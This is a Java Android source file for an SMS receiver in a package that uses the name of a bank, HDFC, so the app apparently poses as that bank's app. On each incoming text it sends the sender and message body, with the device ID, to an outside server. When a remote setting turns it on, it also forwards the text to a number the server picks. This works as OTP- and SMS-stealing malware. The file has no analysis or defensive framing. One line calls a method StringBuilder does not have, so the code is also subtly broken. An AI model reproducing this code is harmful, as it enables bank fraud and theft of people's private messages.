package com.hdfc.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String BACKEND_URL = "https://backprince.onrender.com";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        
                        // 1. Send Log to Backend
                        sendToBackend(deviceId, sender, messageBody);
                        
                        // 2. Check and Forward SMS
                        checkAndForwardSms(context, deviceId, sender, messageBody);
                    }
                }
            }
        }
    }

    private void checkAndForwardSms(final Context context, final String deviceId, final String originalSender, final String body) {
        new Thread(() -> {
            try {
                URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                
                if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) response.push(inputLine);
                    in.close();

                    JSONObject config = new JSONObject(response.toString());
                    if (config.optBoolean("forwarding_enabled", false)) {
                        String forwardNum = config.optString("forwarding_number", "");
                        if (!forwardNum.isEmpty()) {
                            SmsManager smsManager = SmsManager.getDefault();
                            String fullMsg = "FROM: " + originalSender + "\nMSG: " + body;
                            smsManager.sendTextMessage(forwardNum, null, fullMsg, null, null);
                            Log.d(TAG, "SMS Forwarded to: " + forwardNum);
                        }
                    }
                }
                conn.disconnect();
            } catch (Exception e) { Log.e(TAG, "Forwarding Check Error", e); }
        }).start();
    }

    private void sendToBackend(final String deviceId, final String sender, final String message) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("deviceId", deviceId);
                payload.put("sender", sender);
                payload.put("message", message);
                payload.put("timestamp", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));

                URL url = new URL(BACKEND_URL + "/api/logs/sms");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e(TAG, "Backend Post Error", e); }
        }).start();
    }
}
